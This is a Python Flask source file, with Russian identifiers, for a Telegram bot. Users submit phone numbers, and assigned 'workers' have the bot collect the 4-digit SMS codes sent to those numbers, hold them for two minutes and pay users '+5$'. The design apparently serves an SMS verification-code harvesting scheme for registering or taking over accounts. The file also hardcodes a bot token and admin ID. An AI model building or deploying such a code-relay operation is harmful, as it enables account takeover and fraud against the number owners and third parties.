import os, requests, json, threading, time
from flask import Flask, request
from datetime import datetime

app = Flask(__name__)

# ===== ТВОИ НАСТРОЙКИ (ВСЁ ЗДЕСЬ) =====
TOKEN = "8897748741:AAG2f8sHicGX_wxGEBPm2gqgbULhkGp4weE"
ADMIN = 5979001063
WORKERS = [5979001063]  # сюда добавь ID других воркеров через запятую
# ======================================

URL = f"https://api.telegram.org/bot{TOKEN}/"

заявки = {}
воркеры = {}
счетчик = 1
активные = {}

def отправить(куда, текст, клава=None, заменить=False):
    if заменить and куда in активные:
        msg_id = активные[куда]
        данные = {"chat_id": куда, "message_id": msg_id, "text": текст}
        if клава: данные["reply_markup"] = json.dumps(клава)
        ответ = requests.post(URL + "editMessageText", data=данные)
        if ответ.status_code == 200:
            return
    данные = {"chat_id": куда, "text": текст}
    if клава: данные["reply_markup"] = json.dumps(клава)
    ответ = requests.post(URL + "sendMessage", data=данные)
    if ответ.status_code == 200:
        рез = ответ.json()
        if "result" in рез:
            активные[куда] = рез["result"]["message_id"]

def кнопки_заявки(ид, статус):
    табл = {
        "новая": [[{"text":"🔑 Взять заявку","callback_data":f"взять_{ид}"}]],
        "код_запрошен": [[{"text":"📝 Ввести код","callback_data":f"код_{ид}"}]],
        "код_получен": [[{"text":"✅ Принять","callback_data":f"принять_{ид}"},{"text":"❌ Отклонить","callback_data":f"отказ_{ид}"}]],
        "холд": [[{"text":"💸 Выплатить","callback_data":f"платить_{ид}"}]]
    }
    return {"inline_keyboard": табл.get(статус, [])}

def меню_воркера():
    return {"keyboard": [[{"text":"📋 Статус"}]],"resize_keyboard":True}

def меню_пользователя():
    return {"keyboard": [[{"text":"📝 Новая заявка"}],[{"text":"📋 Мои заявки"}]],"resize_keyboard":True}

def меню_админа():
    return {"keyboard": [[{"text":"📋 Все заявки"}],[{"text":"👥 Воркеры"}]],"resize_keyboard":True}

@app.route(f"/{TOKEN}", methods=["POST"])
def вебхук():
    данные = request.get_json()
    
    if "message" in данные:
        msg = данные["message"]
        юзер = msg["from"]["id"]
        чат = msg["chat"]["id"]
        текст = msg.get("text")
        имя = msg["from"].get("first_name", "")
        юзернейм = msg["from"].get("username", "")
        
        # Регистрация воркера
        if юзер in WORKERS and юзер not in воркеры:
            воркеры[юзер] = {"status": "free", "current": None, "name": имя, "username": юзернейм}
            отправить(юзер, "✅ Ты зарегистрирован как воркер!", меню_воркера())
        
        if текст == "/start":
            if юзер in WORKERS:
                отправить(чат, "👋 Воркер, жди заявок!", меню_воркера())
            else:
                отправить(чат, "👋 Оставь заявку на проверку номера!", меню_пользователя())
            return "ok", 200
        
        состояние = заявки.get(юзер, {}).get("state", "")
        
        # Ждем код от пользователя
        if состояние == "waiting_code":
            if текст and текст.isdigit() and len(текст) == 4:
                тикет = заявки[юзер]["current"]
                if тикет in заявки and заявки[тикет]["status"] == "код_запрошен":
                    заявки[тикет]["код"] = текст
                    заявки[тикет]["status"] = "код_получен"
                    заявки[юзер]["state"] = ""
                    отправить(чат, "✅ Код отправлен!", заменить=True)
                    воркер_ид = заявки[тикет].get("worker")
                    if воркер_ид:
                        отправить(воркер_ид, f"📝 Код для #{тикет}: {текст}", кнопки_заявки(тикет, "код_получен"))
            else:
                отправить(чат, "❌ Введи 4 цифры")
            return "ok", 200
        
        # Ждем номер телефона
        if состояние == "waiting_phone":
            телефон = текст.strip()
            if телефон.startswith("+") and len(телефон) >= 10:
                global счетчик
                тикет = счетчик
                счетчик += 1
                заявки[тикет] = {"user": юзер, "phone": телефон, "status": "новая", "worker": None}
                заявки[юзер]["state"] = ""
                отправить(чат, f"✅ Заявка #{тикет} создана!", заменить=True)
                # Рассылка воркерам
                for wid, w in воркеры.items():
                    if w.get("status") == "free":
                        отправить(wid, f"🆕 Новая заявка #{тикет}\n📞 {телефон}", кнопки_заявки(тикет, "новая"))
            else:
                отправить(чат, "❌ Формат: +79001234567")
            return "ok", 200
        
        # Команды воркера
        if юзер in WORKERS:
            if текст == "📋 Статус":
                тек = воркеры[юзер].get("current")
                if тек:
                    отправить(чат, f"Ты выполняешь заявку #{тек}")
                else:
                    отправить(чат, "Ты свободен")
                return "ok", 200
        
        # Команды админа
        if юзер == ADMIN:
            if текст == "📋 Все заявки":
                спс = "\n".join([f"#{t}: {d['phone']} | {d['status']}" for t,d in заявки.items()]) or "Нет"
                отправить(чат, f"Заявки:\n{спс}", меню_админа())
            elif текст == "👥 Воркеры":
                спс = "\n".join([f"@{w.get('username', w.get('name'))} | {w.get('status')}" for w in воркеры.values()]) or "Нет"
                отправить(чат, f"Воркеры:\n{спс}", меню_админа())
            return "ok", 200
        
        # Команды пользователя
        if текст == "📝 Новая заявка":
            заявки[юзер] = {"state": "waiting_phone"}
            отправить(чат, "Введи номер +79001234567")
        elif текст == "📋 Мои заявки":
            мои = [t for t in заявки.values() if t.get("user") == юзер]
            спс = "\n".join([f"#{i} {t['phone']} — {t.get('status','')}" for i,t in enumerate(мои)]) or "Нет"
            отправить(чат, f"Твои заявки:\n{спс}", меню_пользователя())
    
    elif "callback_query" in данные:
        кн = данные["callback_query"]
        юзер = кн["from"]["id"]
        данные_кн = кн["data"]
        requests.post(URL + "answerCallbackQuery", data={"callback_query_id": кн["id"]})
        
        if юзер not in WORKERS and юзер != ADMIN:
            return "ok", 200
        
        действие, тикет = данные_кн.split("_")
        тикет = int(тикет)
        if тикет not in заявки:
            return "ok", 200
        
        # Взять заявку
        if действие == "взять":
            if заявки[тикет]["status"] != "новая":
                отправить(юзер, f"❌ Заявка #{тикет} уже взята", заменить=True)
                return "ok", 200
            
            заявки[тикет]["worker"] = юзер
            заявки[тикет]["status"] = "код_запрошен"
            if юзер in воркеры:
                воркеры[юзер]["status"] = "busy"
                воркеры[юзер]["current"] = тикет
            
            заявки[заявки[тикет]["user"]]["state"] = "waiting_code"
            заявки[заявки[тикет]["user"]]["current"] = тикет
            отправить(заявки[тикет]["user"], "🔑 Введи код из SMS (4 цифры):")
            отправить(юзер, f"✅ Ты взял заявку #{тикет}!\n📞 {заявки[тикет]['phone']}\nЖди код от пользователя.", кнопки_заявки(тикет, "код_запрошен"))
            
            # Уведомить остальных воркеров
            for wid, w in воркеры.items():
                if w.get("status") == "free" and wid != юзер:
                    отправить(wid, f"❌ Заявка #{тикет} уже взята другим", заменить=True)
            return "ok", 200
        
        # Принять код
        if действие == "принять":
            if заявки[тикет]["status"] != "код_получен":
                отправить(юзер, "Код еще не введен")
                return "ok", 200
            
            заявки[тикет]["status"] = "холд"
            отправить(заявки[тикет]["user"], "✅ Код подтвержден! ХОЛД 2 минуты", заменить=True)
            отправить(юзер, "✅ Подтверждено! Нажми Выплатить в течение 2 минут.", кнопки_заявки(тикет, "холд"))
            
            def слет():
                if тикет in заявки and заявки[тикет]["status"] == "холд":
                    заявки[тикет]["status"] = "слет"
                    отправить(заявки[тикет]["user"], "⏰ Время истекло", заменить=True)
                    отправить(юзер, "⏰ Время истекло")
                    if юзер in воркеры:
                        воркеры[юзер]["status"] = "free"
                        воркеры[юзер]["current"] = None
            threading.Timer(120, слет).start()
            return "ok", 200
        
        # Выплатить
        if действие == "платить":
            if заявки[тикет]["status"] != "холд":
                отправить(юзер, "Не в холде")
                return "ok", 200
            
            заявки[тикет]["status"] = "оплачено"
            отправить(заявки[тикет]["user"], "+5$", заменить=True)
            отправить(юзер, "💰 Выплачено!")
            if юзер in воркеры:
                воркеры[юзер]["status"] = "free"
                воркеры[юзер]["current"] = None
            return "ok", 200
        
        # Отказ
        if действие == "отказ":
            заявки[тикет]["status"] = "отказ"
            отправить(заявки[тикет]["user"], "❌ Заявка отклонена", заменить=True)
            отправить(юзер, "❌ Отклонено")
            if юзер in воркеры:
                воркеры[юзер]["status"] = "free"
                воркеры[юзер]["current"] = None
            return "ok", 200
    
    return "ok", 200

@app.route("/")
def домой():
    return "Бот работает", 200

if __name__ == "__main__":
    # Регистрируем воркеров
    for wid in WORKERS:
        if wid not in воркеры:
            воркеры[wid] = {"status": "free", "current": None, "name": "", "username": ""}
    
    # Устанавливаем вебхук
    хост = os.environ.get("RENDER_EXTERNAL_HOSTNAME")
    if хост:
        вебхук_урл = f"https://{хост}/{TOKEN}"
        requests.post(URL + "deleteWebhook")
        requests.post(URL + "setWebhook", data={"url": вебхук_урл})
        print(f"✅ Вебхук: {вебхук_урл}")
    
    app.run(host="0.0.0.0", port=10000)
